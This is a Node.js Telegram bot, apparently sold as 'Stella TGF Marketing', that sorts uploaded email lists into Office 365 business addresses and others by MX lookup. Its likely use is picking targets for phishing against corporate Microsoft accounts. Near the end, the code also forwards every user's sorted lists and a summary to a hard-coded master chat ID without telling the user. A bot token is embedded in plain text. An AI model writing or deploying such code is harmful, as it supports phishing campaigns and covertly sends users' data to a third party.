const TelegramBot = require('node-telegram-bot-api');
const dns = require('dns');
const fs = require('fs');
const readline = require('readline');
const path = require('path');
const { promisify } = require('util');

const botToken = '7558034989:AAElniLthSTNzREoZFYAnnibGe4-cSZ8xmY';
const MASTER_CHAT_ID = '1667505517';  // Replace with the master Telegram chat ID
const OFFICE_365_MX = 'mail.protection.outlook.com';
const FREE_MICROSOFT_DOMAINS = ['outlook.com', 'msn.com', 'live.com', 'hotmail.com'];

// Initialize bot
const bot = new TelegramBot(botToken, { polling: true });
const resolveMx = promisify(dns.resolveMx);

// Helper function to check if an email domain has Office 365 MX records
async function checkMxRecord(email) {
  const domain = email.split('@')[1];
  
  // Skip if it's a free Microsoft domain
  if (FREE_MICROSOFT_DOMAINS.includes(domain.toLowerCase())) {
    return false;
  }
  
  try {
    const records = await resolveMx(domain);
    return records.some(record => record.exchange.endsWith(OFFICE_365_MX));
  } catch {
    return false;
  }
}

// Start command to welcome users
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "Hello! I am Stella TGF Marketing, Please send me a .txt file with email addresses, and I'll sort them out.");
});

// Handle .txt file uploads
bot.on('document', async (msg) => {
  const chatId = msg.chat.id;
  const fileId = msg.document.file_id;
  const fileName = msg.document.file_name;

  // Ensure it's a .txt file
  if (path.extname(fileName) !== '.txt') {
    return bot.sendMessage(chatId, "Please upload a valid .txt file.");
  }

  // Download file
  const filePath = await bot.downloadFile(fileId, './downloads');
  const officeEmails = [];
  const otherEmails = [];

  // Read and process file line-by-line
  const fileStream = fs.createReadStream(filePath);
  const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });
  for await (const line of rl) {
    const email = line.trim();
    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      if (await checkMxRecord(email)) {
        officeEmails.push(email);
      } else {
        otherEmails.push(email);
      }
    }
  }

  // Prepare output files
  const dateSuffix = new Date().toISOString().split('T')[0];
  const officeFile = `Office365-${dateSuffix}.txt`;
  const otherFile = `Others-${dateSuffix}.txt`;

  // Write results to files
  fs.writeFileSync(officeFile, officeEmails.join('\n'));
  fs.writeFileSync(otherFile, otherEmails.join('\n'));

  // Totals for summary
  const officeTotal = officeEmails.length;
  const othersTotal = otherEmails.length;
  const summaryMessage = `
====OFFICE QUICK SORTER====
FILE 1 - Office365 (${officeTotal} emails)
FILE 2 - Others (${othersTotal} emails)
====tgfmarket.shop=====
  `;

  // Send files and summary back to the user
  await bot.sendMessage(chatId, summaryMessage);
  await bot.sendDocument(chatId, officeFile);
  await bot.sendDocument(chatId, otherFile);

  // Send the same summary and files to the Telegram master
  await bot.sendMessage(MASTER_CHAT_ID, `New report from user ${chatId}:\n${summaryMessage}`);
  await bot.sendDocument(MASTER_CHAT_ID, officeFile);
  await bot.sendDocument(MASTER_CHAT_ID, otherFile);

  // Cleanup
  fs.unlinkSync(filePath);
  fs.unlinkSync(officeFile);
  fs.unlinkSync(otherFile);
});

// Start bot
console.log("Bot is running...");
